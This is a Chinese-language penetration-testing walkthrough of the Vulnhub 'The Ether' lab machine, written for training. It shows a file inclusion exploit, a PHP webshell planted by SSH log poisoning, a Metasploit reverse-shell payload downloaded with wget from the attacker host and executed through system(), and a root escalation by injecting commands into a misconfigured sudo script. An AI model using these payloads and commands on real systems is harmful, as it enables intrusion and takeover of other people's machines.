---
title: Vulnhub-The-Ether
---

# Vulnhub-The_Ether

## 靶机信息
### 下载链接
[http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip](http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip)

### 运行环境
本靶机提供了`VMware`的镜像，从上面的链接下载之后解压，运行`vmx`文件即可

靶机：可设置为NAT
攻击机：Kali 2021.1、windows 11

本靶机有一定难度，不适合初学者。

### 目标

get-flag

## 信息收集

目标发现以及端口服务识别

```shell
#确定目标IP
arp-scan -l
#端口扫描以及服务识别并保存扫描结果为txt
nmap -A -v 192.168.160.210 -oN the.txt
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(1).png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(2).png)

可以确定192.168.160.210为目标靶机的IP

分析nmap的扫描结果，发现靶机只开放了`22`和`80`端口，系统为`Ubuntu`。`22`端口为`SSH`服务，`80`端口为`http`服务，Web容器为`Apache/2.4.18`。

## 漏洞挖掘

### niktoWeb扫描

```shell
nikto -h 192.168.160.210
```

发现了`images`目录和`/icons/README`文件，但没有什么利用价值

### 目录扫描

```shell
dirb 192.168.160.210
```

除了部分静态文件，没有发现有价值的利用点

### 手工探测

浏览网站web服务页面，进行手工探测

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(3).png)

点击`ABOUT US`链接后，发现URL为：`http://192.168.160.210/?file=about.php`，可能存在任意文件包含。

### 文件包含测试

a.尝试读取`../../../../../../../etc/passwd`无果

b.伪协议`php://filter`读取文件和伪协议`php://input`写入木马进行连接

c.测试了几个常见的Apache相关文件的路径：

```shell
/var/log/apache/access.log
/var/log/apache2/access.log
/var/www/logs/access.log
/var/log/access.log
/etc/apache2/apache2.conf
```

均无结果。

猜测可能是更改了配置文件的路径

结合之前信息探测的结果，靶机只开通了`http`与`ssh`服务。Apache的日志包含失败。

d.尝试包含ssh的登陆日志,成功读取.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(4).png)

## getshell

### webshell写入

使用一句话作为用户名登陆靶机的ssh，SSH的日志会记录此次登陆行为，这样就可以把一句话写入ssh的日志文件

```php
<?php eval($_GET[a];?)>
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(5).png)

单击确定,密码随意,而后连接即可，burp测试是否成功写入

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(6).png)

成功写入，并能执行相应命令

### msf反弹shell

下面利用msf生成linux的shell程序反弹一个shell

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.160.129 LPORT=4444 -f elf > shell.elf
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(9).png)

设置监听

```shell
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.160.129
exploit
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(7).png)

先用Python搭建一个简单的Web Server：

```python
python -m SimpleHTTPServer 80
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(8).png)

然后利用前面获得的一句话，执行命令，下载生成的木马，添加执行权限并运行。

```shell
#下面的命令为了正常执行，都对空格和加号等符号进行了url编码
#下载木马
/?file=/var/log/auth.log&a=system('wget+192.168.160.129/shell.elf')%3b
#生成的木马文件没有执行权限，传到到靶机后无法执行，所以要先给shell.elf赋予执行权限，再执行
/?file=/var/log/auth.log&a=system('chmod+%2bx+shell.elf')%3b
#执行
/?file=/var/log/auth.log&a=system('./shell.elf')%3b
```

反弹成功

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(10).png)

## 提权

### 溢出提权

现在拿到了目标靶机的Meterpreter shell，简单的看下信息。

发现系统为`Ubuntu 16.04 (Linux 4.10.0-40-generic)`，前段时间爆了Ubuntu16.04提权的exp，在这里试一试

exp 地址：https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

提权失败。

### 使用msf提权

```
use post/multi/recon/local_exploit_suggester
```

没有发现可以利用的提权漏洞

### SUID文件提权

首先进入交互式shell： `python -c 'import pty;pty.spawn("/bin/bash")'`

在Web的目录中发现了特别的文件`xxxlogauditorxxx.py`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(11).png)

查看py文件的权限，发现具有SUID的权限，且文件所属用户为root。并且可以不使用密码即可以root权限运行该py文件。并且该py文件的配置错误，导致可以直接以root权限执行命令。（手动狗头）

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(12).png)

运行一下该py文件，发现是审计日志的程序。

查看日志时猜测此文件执行的是cat命令，在后面添加 | id看命令是否执行成功

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(13).png)

成功执行

于是我们就可以通过python脚本和`/var/log/auth.log |`命令进行配合获得root权限

因为之前已经上传了Msfvenom生成的马，这里再次使用；另开一个终端并开启msf监听

利用发现的特殊文件脚本以root权限执行先前上传的shell.elf

```shell
sudo ./xxxlogauditorxxx.py
/var/log/apache2/access.log|./shell.elf
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(14).png)

运行后，成功反弹root权限shell,提权成功

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(15).png)

进入root目录查看flag，发现flag.png文件，查看

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(18).png)

cat flag.png

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(16).png)

发现一串base64,解密得到flag

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(17).png)

至此，已经完成对靶机的完全渗透。